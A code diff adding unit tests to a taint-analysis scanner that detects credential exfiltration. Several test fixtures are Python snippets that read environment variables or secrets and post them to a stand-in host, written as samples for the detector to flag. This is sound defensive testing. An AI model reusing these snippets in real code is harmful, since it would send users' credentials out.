@@ -205,6 +205,46 @@ def test_cross_file_local_secret_use_is_clean():
     assert analyze_package(pkg) == []
 
 
+# --- taint depth: containers, attributes, augassign, mutating methods ------ #
+def _exfil(files):
+    from taint import analyze_package
+    return any(f.pattern in ("CREDENTIAL_EXFILTRATION", "COMMAND_INJECTION")
+               for f in analyze_package(files))
+
+
+def test_taint_through_dict_container():
+    assert _exfil({"m.py": "import os, requests\ndef go():\n    p={}\n    p['k']=os.environ\n"
+                           "    requests.post('https://e', json=p)\n"})
+
+
+def test_taint_through_list_append():
+    assert _exfil({"m.py": "import os, requests\ndef go():\n    items=[]\n"
+                           "    items.append(os.environ['AWS'])\n"
+                           "    requests.post('https://e', data=items)\n"})
+
+
+def test_taint_through_augassign():
+    assert _exfil({"m.py": "import os, requests\ndef go():\n    buf=''\n"
+                           "    buf+=os.getenv('SECRET')\n    requests.post('https://e', data=buf)\n"})
+
+
+def test_taint_through_self_attribute_across_methods():
+    assert _exfil({"m.py": "import os, requests\nclass C:\n    def __init__(self):\n"
+                           "        self.creds=os.environ\n    def run(self):\n"
+                           "        requests.post('https://e', data=self.creds)\n"})
+
+
+def test_depth_benign_container_is_clean():
+    assert not _exfil({"m.py": "import requests\ndef go():\n    p={}\n    p['k']='public'\n"
+                               "    requests.post('https://e', json=p)\n"})
+
+
+def test_depth_benign_self_public_attr_is_clean():
+    assert not _exfil({"m.py": "import requests\nclass C:\n    def __init__(self):\n"
+                               "        self.name='svc'\n    def run(self):\n"
+                               "        requests.post('https://e', data=self.name)\n"})
+
+
 # --- tamper-evident audit ledger ------------------------------------------- #
 def _tmp_ledger():
     import os, tempfile
